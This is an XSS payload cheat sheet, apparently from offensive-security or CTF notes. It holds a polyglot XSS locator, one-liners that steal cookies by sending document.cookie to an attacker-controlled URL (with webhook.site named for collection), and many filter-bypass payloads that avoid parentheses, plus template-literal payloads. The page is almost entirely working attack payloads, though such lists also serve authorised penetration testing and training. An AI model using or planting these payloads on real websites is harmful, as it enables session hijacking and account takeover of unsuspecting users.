# General Resources
[Webhook.site](https://webhook.site/) - Basically required to steal cookies without Burp Collaborator
[Portswigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) - XSS payload search (useful for making Burp Intruder payloads)

# XSS Locator
Paste this into any area you suspect is vulnerable to XSS
```javascript
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

# Stealing Cookies
Some quick payloads for stealing cookies ``o(￣▽￣)ｄ``
## General One-Liner (Use this one first)
```javascript
<script>var i=new Image;i.src="[URL]/?"+document.cookie;</script>
```
**Example usage of above:**
```javascript
onmouseover=eval(var i=new Image;i.src="[URL]/?"+document.cookie;)
```
## Using ``<img>`` Tag
```javascript
<img src=x onerror="this.src='[URL]/?'+document.cookie;this.removeAttribute('onerror');"/>
```

# Filter Bypasses
## HTML Entities
For a useful list of HTML entities, see the [HTML](Web/Encodings/HTML.md) page
```javascript
<IMG SRC=javascript:alert(&quot;1&quot;)>
```
## No parentheses
Some XSS payloads that dont require parentheses, the full list is available [here](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
```javascript
alert`23`

eval.call`${'alert\x2823\x29'}`

eval.apply`${[`alert\x2823\x29`]}`

setTimeout`alert\x2823\x29`
setInterval`alert\x2823\x29`

onerror=alert;throw 23;

window.name='javascript:alert\x2823\x29';
Reflect.set.call`${location}${'href'}${name}`

Reflect.apply.call`${alert}${undefined}${[23]}`

navigation.navigate`javascript:alert\x2823\x29`

var{haha:onerror=alert}=0;throw 1
var{a:onerror}={a:alert};throw 1

'alert\x2823\x29'instanceof{[Symbol.hasInstance]:eval}

{onerror=alert}throw 23

throw{},onerror??=alert,"XSS"??123

[].sort.call`${alert}23`

[].map.call`${eval}\\u{61}lert\x2823\x29`

window.name='javascript:alert(23)';
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`;
```

# AngularJS
See [PayloadsAllTheThings - XSS in AngularJS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md)

# XSS Template Literal Payloads
Taken from [here](https://security.stackexchange.com/questions/241016/xss-with-template-literals)
```javascript
alert(1)
${alert(1)}
alert(1);
${alert(1)};
`alert(1)`
`${alert(1)}`
`${alert(1)}`;
alert(1);
${alert(1)}/*
```

